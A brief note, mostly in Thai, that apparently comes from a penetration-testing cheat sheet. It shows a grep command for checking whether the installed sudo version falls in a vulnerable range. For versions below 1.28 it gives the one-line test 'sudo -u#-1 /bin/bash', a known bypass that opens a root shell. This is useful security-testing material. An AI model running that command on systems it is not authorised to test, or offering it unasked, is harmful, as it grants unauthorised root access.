Check sudo version
```
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
ถ้าไม่ขึ้นอะไรแสดงว่าไม่อยู่ในช่วงช่วงเวอชั่นที่มีช่องโหว่

แต่ if version < 1.28
มีความเสี่ยงว่าจะมีช่องโหว่ทดสอบโดย
```
sudo -u#-1 /bin/bash
```
